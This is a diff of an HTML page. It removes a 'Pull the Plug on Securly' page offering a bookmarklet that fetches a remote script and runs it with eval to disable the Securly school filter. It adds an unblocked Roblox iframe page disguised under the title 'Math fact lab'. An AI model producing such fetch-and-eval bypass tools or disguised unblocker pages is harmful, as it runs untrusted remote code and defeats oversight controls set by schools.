@@ -1,95 +1,127 @@
-
 <!DOCTYPE html>
 <html>
 <head>
-    <div>
-        <div>
-    <title>Pull the Plug on Securly</title>
-		<link rel="icon" href="https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/IMG/favicon.ico">
-    <style type="text/css">
-        body {
-            background-image: url('https://github.com/zek-c/Securly-Kill-V111/blob/main/IMG/background.gif?raw=true');
-            background-size: cover;
-            color: #000;
-            font-family: 'Roboto', monospace;
-        }
+	<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-MY0THGFRYS"></script>
+  <title>Math fact lab</title>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3798877607103818" crossorigin="anonymous"></script>
+	  <meta charset="UTF-8">
+  <meta name="description" content="PASTE HAS W RIZZ">
+  <meta name="keywords" content="w rizz, unblocked, roblox">
+  <meta name="author" content="Paste">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-        header {
-            text-align: center;
-            padding: 20px;
-        }
-
-        h1 {
-            font-size: 50px;
-            margin: 0;
-        }
-
-        p {
-            font-size: 30px;
-            margin: 0;
-            padding: 20px;
-            text-align: center;
-        }
-         a {
-            font-size: 30px;
-            margin: 0;
-            padding: 20px;
-            text-align: center;
-        }
-        .button {
-	position: relative;
-	width: 230px;
-	height: 47px;
-	border: 1px solid rgb(5, 39, 162);
-	color: rgb(10, 16, 214);
-	background: rgba(0, 0, 0, 0.08);
-	border-radius: 6px;
-	margin: 20px auto;
-	display: flex;
-	justify-content: center;
-	align-items: center;
-	font-size: 24px;
-	user-select: none;
-        font-weight: 500;
+<style>
+html, body {
+    width: 100%;
+    height: 100%;
+    padding: 0;
+    margin: 0;
+}
+center {
+    position: absolute;
+    top: 0;
+    width:100%;
+    height:100%;
+}
+iframe {
+    position: absolute;
+    top: 0;
+    left: 50%;
+    transform: translate(-50%);
+    padding: 0;
+    margin: 0;
+    border: none;
+    width: 50%;
+    height: 80%;
+    z-index: 1;
+    user-select: none;
+}
+.fullScreen {
+    padding: 0;
+    margin: 0;
+    width: 100%;
+    height: 100%;
+    position: absolute;
+    top: 0;
+    left: 0;
+    transform: none;
+    z-index:9999;
+}
+.scrollbar-hidden::-webkit-scrollbar {
+  display: none;
 }
 
-.button:active {
-	background: rgb(255, 255, 255);
+html {
+    overflow: scroll;
+    overflow-x: hidden;
+}
+::-webkit-scrollbar {
+    width: 0;  /* Remove scrollbar space */
+    background: transparent;  /* Optional: just make scrollbar invisible */
+}
+/* Optional: show position indicator in red */
+::-webkit-scrollbar-thumb {
+    background: #FF0000;
+}
+div {
+    margin: 8px 8px 8px 8px;
+}
+h3{
+    z-index:52;
+}
+</style>
+</head>
+<iframe src="https://acb.caculatorgeo.online/demo" id="frame"></iframe>
+<div>
+<h3 style="font-size:20px;font-family:Arial;"><a href="../index.html">Paste's Roblox</a></h3>
+<p style="font-family: Arial;">&nbsp;Press <b>F11</b> to enter <a href="#" onclick="openFullscreen()">fullscreen</a>.</p>
+<script>
+var game = "/roblox/";
+</script>
+<script>
+    var _fullscreen = false;
+    var _frame = document.getElementById("frame");
+function openFullscreen() {
+    if (document.documentElement.requestFullscreen) {
+        document.documentElement.requestFullscreen();
+    } else if (document.documentElement.webkitRequestFullscreen) {
+        document.documentElement.webkitRequestFullscreen();
+    } else if (document.documentElement.msRequestFullscreen) {
+        document.documentElement.msRequestFullscreen();
+    }
+    _fullscreen = true;
+    _frame.setAttribute("class", "fullScreen");   
 }
 
-.button-text {
-	opacity: 0;
-	user-select: none;
-	position: absolute;
-	top: 0;
-	right: 0;
-	bottom: 0;
-	left: 0;
-	height: 100%;
-	width: 100%;
-}
-    </style>
+(function(){
+    document.onkeydown=function(event) {
+        if (_fullscreen && (event.keyCode === 27 || event.keyCode === 122)) {
+            _fullscreen = false;
+            _frame.setAttribute("class", "");
+            setTimeout(() => document.exitFullscreen(), 1000);
+        } else if (!_fullscreen && event.keyCode === 122) {
+            _fullscreen = true;
+            _frame.setAttribute("class", "fullScreen");
+        }
+    }
 
-<body>
-    <header>
-        <h1>The place where Securly comes to die</h1>
-    </header>
+    window.onresize = function(e) {
+        if (!(!window.screenTop && !window.screenY)) {
+            if (!_fullscreen) {
+                _fullscreen = true;
+                _frame.setAttribute("class", "fullScreen");
+            }
+        } else if (_fullscreen) {
+            _fullscreen = false;
+            _frame.setAttribute("class", "");
+        }
+    }
 
-    <p>Drag Bookmarklet Below To Bookmarks Bar</p>
+    window.onresize(null);
 
-    <div>
-        
-
-<div class="button">KillCurly<a href="javascript:fetch('https://res.cloudinary.com/dxttxbdrd/raw/upload/v1693510756/kill_qn1hjn.js').then(r => r.text()).then(r => eval(r))" class="button-text">KillCurly</a></div>
-            
-   <div>
-    
-    <p>or if running javascript from bookmarklets is blocked, use insecurly below</p>
-    
-    <div>
-	    <div class="button">Insecurly<a class='button-text' href='/bypassi'>Insecurly</a></div>
-	
-    
-
-    </div> </head>
+    _frame.contentWindow.document.addEventListener("keydown", document.onkeydown);
+})();
+</script>
+</body>
 </html>
